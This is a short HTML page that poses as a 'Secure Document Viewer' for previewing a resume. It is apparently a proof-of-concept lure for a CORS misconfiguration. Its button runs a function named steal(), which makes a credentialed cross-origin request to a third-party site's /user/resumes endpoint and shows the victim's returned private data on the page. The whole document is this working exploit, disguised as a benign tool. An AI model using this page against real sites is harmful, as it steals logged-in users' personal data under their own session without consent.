<!DOCTYPE html>
<html>
<head>
  <title>Secure Document Viewer</title>
</head>
<body>
  <h2>Secure Document Viewer</h2>
  <p>Click below to preview resume securely</p>
  <button onclick="steal()">View</button>
  <pre id="output" style="background:#eee; padding:10px; border:1px solid #ccc;"></pre>

  <script>
    function steal() {
      fetch("https://synechron.resumod.co/user/resumes", {
        method: "GET",
        credentials: "include"
      })
      .then(response => {
        document.getElementById("output").innerText = "Status: " + response.status;
        return response.text();
      })
      .then(data => {
        document.getElementById("output").innerText += "\n\nResponse:\n" + data;
      })
      .catch(error => {
        document.getElementById("output").innerText = "Error: " + error;
      });
    }
  </script>
</body>
</html>
